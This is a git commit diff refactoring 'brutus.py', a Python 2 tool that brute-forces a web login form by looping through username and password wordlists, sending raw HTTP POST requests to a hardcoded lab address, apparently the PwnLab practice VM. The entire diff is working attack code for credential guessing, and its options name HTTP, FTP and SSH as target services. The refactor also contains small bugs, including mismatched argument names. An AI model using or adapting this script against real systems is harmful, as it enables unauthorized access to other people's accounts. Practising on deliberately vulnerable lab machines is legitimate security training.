e5f0fea4d7751a6c3295040456b8b3794b54f5d0
bloorq@gmail.com <bloorq@gmail.com>
2016-08-10 06:20:20 +0100

    brutus.py - refactoring;

--- brutus/brutus.py
+++ brutus/brutus.py
@@ -21,6 +21,35 @@ def send_request(target, payload, response_size=4096):
     return response
 
 
+def single_try(user, passwd, counter):
+    user = user.strip()
+    passwd = passwd.strip()
+    print "[*] Trying {}:{}... ({})".format(user, passwd, counter)
+
+    # create POST payload
+    payload = "user={}&pass={}&submit=Login".format(user, passwd)
+    payload_len = len(payload)
+
+    # create request
+    # pwnlab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # pwnlab.connect(("192.168.1.2", 80))
+    pwnlab = create_socket("192.168.1.2", 80)
+
+    req = "POST /?page=login HTTP/1.1\r\nHost: 192.168.1.2\r\n" \
+          "Content-Type: application/x-www-form-urlencoded\r\n" \
+          "Content-Length: {}\r\n\r\n".format(payload_len)
+
+    req += payload + "\r\n\r\n"
+
+    # send request and check response
+    resp = send_request(pwnlab, req)
+
+    counter += 1
+    if args.e not in resp:
+        print "[+] Login sucessful !!!"
+        exit("{}:{}".format(user, passwd))
+
+
 # @TODO: option to define success pattern, multi-threading
 
 
@@ -31,45 +60,32 @@ if __name__ == "__main__":
 
     """)
 
-    parser.add_argument('-u', help='IP or URL of the target')
+    parser.add_argument('-t', help='IP or URL of the target')
     parser.add_argument('-s', help='service to be attacked (HTTP, FTP, SSH)')
-    parser.add_argument('-p', help='service TCP port')
+    parser.add_argument('-r', help='service TCP port')
+    parser.add_argument('-e', help='error message to recognize failed attempt')
+    parser.add_argument('-p', help='file with passwords list')
+    parser.add_argument('-u', help='file with usernames list')
 
     args = parser.parse_args()
+    passwords = []
+    usernames = []
 
-    usernames = open("../dictionaries/usernames_14.txt", "r").readlines()
-    passwords = open("../dictionaries/passwords_100.txt", "r").readlines()
+    if args.u:
+        usernames = open(args.U, "r").readlines()
+    if args.p:
+        passwords = open(args.P, "r").readlines()
     counter = 1
 
-    print "[*] Will try {} credentials, hold on...".format(
-        len(usernames) * len(passwords))
-    for user in usernames:
-        for passwd in passwords:
-            user = user.strip()
-            passwd = passwd.strip()
-            print "[*] Trying {}:{}... ({})".format(user, passwd, counter)
+    if len(passwords) > 0 and len(usernames) > 0:
+        print "[*] Will try {} credentials, hold on...".format(
+            len(usernames) * len(passwords))
+        for user in usernames:
+            for passwd in passwords:
+                single_try(user, passwd, counter)
+                counter += 1
 
-            # create POST payload
-            payload = "user={}&pass={}&submit=Login".format(user, passwd)
-            payload_len = len(payload)
-
-            # create request
-            # pwnlab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # pwnlab.connect(("192.168.1.2", 80))
-            pwnlab = create_socket("192.168.1.2", 80)
-
-            req = "POST /?page=login HTTP/1.1\r\nHost: 192.168.1.2\r\n" \
-                  "Content-Type: application/x-www-form-urlencoded\r\n" \
-                  "Content-Length: {}\r\n\r\n".format(payload_len)
-
-            req += payload + "\r\n\r\n"
-
-            # send request and check response
-            resp = send_request(pwnlab, req)
-
-            counter += 1
-            if "Login failed" not in resp:
-                print "[+] Login sucessful !!!"
-                exit("{}:{}".format(user, passwd))
-
-    print "[-] All done, valid credentials not found :("
+        print "[-] All done, valid credentials not found :("
+    else:
+        print "[-] No usernames and/or passwords provided, exiting..."
+        exit(0)
